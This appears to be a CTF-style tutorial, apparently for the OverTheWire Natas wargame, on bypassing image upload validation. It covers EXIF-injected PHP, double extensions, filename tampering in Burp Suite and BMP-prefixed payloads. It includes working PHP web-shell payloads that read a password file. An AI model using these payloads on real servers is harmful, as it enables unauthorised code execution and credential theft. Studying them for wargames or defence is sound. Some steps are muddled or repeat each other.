# Exploiting Image Upload Vulnerabilities

This document provides a comprehensive overview of techniques for exploiting vulnerabilities in image upload functionalities. These methods involve manipulating file metadata, extensions, or content to execute arbitrary code or access unauthorized information.

## Techniques for Exploitation

### 1. Metadata Manipulation and Extension Modification

**Objective:** Bypass file type validation by altering image metadata and file extensions.

#### Steps:
1. **Modify Metadata:**
   - Use tools like `ExifTool` to inject PHP code into the image metadata.
   - Example Command:
     ```sh
     exiftool -Comment="<?php echo system('cat /etc/natas_webpass/natas14'); ?>" image.png
     ```
   - This command embeds PHP code in the metadata, which might be executed if the server improperly handles metadata.

2. **Change File Extension:**
   - Rename the file to a PHP extension, such as `shell.php.png`, and upload it.
   - If the server performs only basic file extension checks, this method may bypass restrictions.

3. **Access the Payload:**
   - Try accessing the file using the PHP extension to see if it is executed.

### 2. Double Extension Exploitation

**Objective:** Utilize double extensions to circumvent file type validation.

#### Steps:
1. **Create a Double Extension File:**
   - Name the file with a double extension, such as `shell.php.png`.
   - This can trick servers that only check the final extension.

2. **Upload and Test:**
   - Upload the file and attempt to access it using different extensions to trigger execution.

### 3. Filename Manipulation Using Burp Suite

**Objective:** Exploit servers that do not properly handle filename extensions.

#### Steps:
1. **Prepare the Payload:**
   - Create an image file with a `.php` extension but rename it as an image file, such as `shell.png`.

2. **Modify Filename in Proxy Tool:**
   - Use Burp Suite or similar tools to modify the file extension in the HTTP request to `.php`.
   - Example:
     - Upload `shell.png`.
     - In Burp Suite, change the filename to `shell.php` in the request before sending it.

3. **Trigger Execution:**
   - Access the file through the server’s URL to verify if the PHP code executes.

### 4. BMP Prefix for PHP Payloads

**Objective:** Utilize file prefixing to execute PHP code in scenarios where the server fails to handle unexpected file formats properly.

#### Steps:
1. **Create Payload with BMP Header:**
   - Prepend a BMP header to the PHP payload.
   - Example Payload:
     ```php
     BMP<?php
     echo system("cat /etc/natas_webpass/natas14");
     ?>
     ```

2. **Generate and Upload File:**
   - Use a tool to create the file with the BMP header.
   - Example Command:
     ```sh
     echo -e "BMP<?php\necho system(\"cat /etc/natas_webpass/natas14\");\n?>" > payload.bmp
     ```

3. **Verify Execution:**
   - Upload the file and check if the PHP code executes when accessed.


- **Effectiveness**: The success of these techniques depends on the server’s file handling and validation mechanisms. These methods may not work on all systems and should be adapted based on the specific server configuration.
